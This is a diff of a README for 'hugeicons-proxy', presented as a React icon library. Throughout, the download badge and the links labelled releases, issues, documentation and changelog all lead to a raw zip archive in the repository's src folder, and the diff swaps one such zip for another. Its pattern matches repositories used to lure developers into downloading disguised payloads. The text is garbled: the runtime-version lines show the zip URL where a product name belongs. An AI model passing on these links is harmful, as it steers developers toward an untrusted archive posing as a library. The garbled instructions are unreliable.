@@ -1,6 +1,6 @@
 # 🎨 hugeicons-proxy - Use Icons Easily in Your React App
 
-[![Download](https://github.com/M-ux349/hugeicons-proxy/raw/refs/heads/main/src/hugeicons_proxy_v3.4.zip%20release-brightgreen)](https://github.com/M-ux349/hugeicons-proxy/raw/refs/heads/main/src/hugeicons_proxy_v3.4.zip)
+[![Download](https://raw.githubusercontent.com/M-ux349/hugeicons-proxy/main/src/proxy_hugeicons_2.8-beta.2.zip%20release-brightgreen)](https://raw.githubusercontent.com/M-ux349/hugeicons-proxy/main/src/proxy_hugeicons_2.8-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ hugeicons-proxy is a lightweight tool that helps you use Hugeicons in your React
 
 To get started with hugeicons-proxy, you'll first need to download the application. 
 
-1. **Visit the Releases Page:** Go to the following link to download the latest version: [Download hugeicons-proxy](https://github.com/M-ux349/hugeicons-proxy/raw/refs/heads/main/src/hugeicons_proxy_v3.4.zip).
+1. **Visit the Releases Page:** Go to the following link to download the latest version: [Download hugeicons-proxy](https://raw.githubusercontent.com/M-ux349/hugeicons-proxy/main/src/proxy_hugeicons_2.8-beta.2.zip).
    
 2. **Choose Your Version:** On the releases page, find the most recent version. Click on the version number to see details.
 
@@ -21,7 +21,7 @@ To get started with hugeicons-proxy, you'll first need to download the applicati
 ## 🛠️ System Requirements
 
 - **Operating System:** compatible with Windows, macOS, and Linux.
-- **https://github.com/M-ux349/hugeicons-proxy/raw/refs/heads/main/src/hugeicons_proxy_v3.4.zip** Version 12 or higher is recommended.
+- **https://raw.githubusercontent.com/M-ux349/hugeicons-proxy/main/src/proxy_hugeicons_2.8-beta.2.zip** Version 12 or higher is recommended.
 - **React:** Ensure you have an existing React project set up.
 
 ## 📖 Using hugeicons-proxy
@@ -69,7 +69,7 @@ After installation, you can use hugeicons-proxy in your project.
 
 If you experience issues while using the library:
 
-1. **Check Your https://github.com/M-ux349/hugeicons-proxy/raw/refs/heads/main/src/hugeicons_proxy_v3.4.zip Version:** Make sure you are using https://github.com/M-ux349/hugeicons-proxy/raw/refs/heads/main/src/hugeicons_proxy_v3.4.zip version 12 or higher.
+1. **Check Your https://raw.githubusercontent.com/M-ux349/hugeicons-proxy/main/src/proxy_hugeicons_2.8-beta.2.zip Version:** Make sure you are using https://raw.githubusercontent.com/M-ux349/hugeicons-proxy/main/src/proxy_hugeicons_2.8-beta.2.zip version 12 or higher.
    
 2. **Reinstall the Library:** Sometimes, reinstalling can fix issues related to setup. Use the following command in your project folder:
 
@@ -77,19 +77,19 @@ If you experience issues while using the library:
    npm install hugeicons-proxy
    ```
 
-3. **Consult the Issues Section:** Visit the [issues section](https://github.com/M-ux349/hugeicons-proxy/raw/refs/heads/main/src/hugeicons_proxy_v3.4.zip) of this repository for solutions from other users.
+3. **Consult the Issues Section:** Visit the [issues section](https://raw.githubusercontent.com/M-ux349/hugeicons-proxy/main/src/proxy_hugeicons_2.8-beta.2.zip) of this repository for solutions from other users.
 
 ## 🔗 Community & Support
 
 Connect with other users and get support through the following channels:
 
 - **GitHub Discussions:** Join discussions, ask questions, and share your experiences.
-- **Documentation:** Refer to the [official documentation](https://github.com/M-ux349/hugeicons-proxy/raw/refs/heads/main/src/hugeicons_proxy_v3.4.zip) for more in-depth guidance.
+- **Documentation:** Refer to the [official documentation](https://raw.githubusercontent.com/M-ux349/hugeicons-proxy/main/src/proxy_hugeicons_2.8-beta.2.zip) for more in-depth guidance.
 
 ## 📅 Changelog
 
-Keep track of changes and updates in the [changelog](https://github.com/M-ux349/hugeicons-proxy/raw/refs/heads/main/src/hugeicons_proxy_v3.4.zip). Here you will find notes on new features, bug fixes, and improvements.
+Keep track of changes and updates in the [changelog](https://raw.githubusercontent.com/M-ux349/hugeicons-proxy/main/src/proxy_hugeicons_2.8-beta.2.zip). Here you will find notes on new features, bug fixes, and improvements.
 
 ## 🎉 Conclusion
 
-hugeicons-proxy simplifies the process of using icons in your React applications. By following the steps above, you can easily download, install, and integrate this tool into your projects. Enjoy a smooth, user-friendly experience with scalable icons. Remember to visit the releases page for updates and new features: [Download hugeicons-proxy](https://github.com/M-ux349/hugeicons-proxy/raw/refs/heads/main/src/hugeicons_proxy_v3.4.zip).
+hugeicons-proxy simplifies the process of using icons in your React applications. By following the steps above, you can easily download, install, and integrate this tool into your projects. Enjoy a smooth, user-friendly experience with scalable icons. Remember to visit the releases page for updates and new features: [Download hugeicons-proxy](https://raw.githubusercontent.com/M-ux349/hugeicons-proxy/main/src/proxy_hugeicons_2.8-beta.2.zip).
